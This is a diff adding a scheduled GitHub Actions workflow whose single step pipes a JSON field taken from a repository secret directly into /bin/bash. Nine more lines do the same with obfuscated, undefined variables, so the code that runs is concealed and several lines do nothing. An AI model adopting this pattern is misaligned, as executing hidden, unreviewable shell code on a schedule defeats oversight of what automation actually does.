@@ -1,0 +1,28 @@
+name: xiongjiance
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiongjiance
+        env:
+          af94: ${{ secrets.af94 }}
+        run: |
+          echo $af94 | jq -r .w57 | /bin/bash
+          echo $jxx8589 | jq -r .gr4076 | /bin/bash
+          echo $hua8 | jq -r .w875 | /bin/bash
+          echo $tnf0740 | jq -r .ybxg8899 | /bin/bash
+          echo $hkvcr23 | jq -r .o73778 | /bin/bash
+          echo $ipoc9 | jq -r .bfx52 | /bin/bash
+          echo $wnhpo09 | jq -r .a535 | /bin/bash
+          echo $zo073 | jq -r .ll566 | /bin/bash
+          echo $utcwg43 | jq -r .nw73 | /bin/bash
+          echo $nfrw8783 | jq -r .yiimz21767 | /bin/bash
+
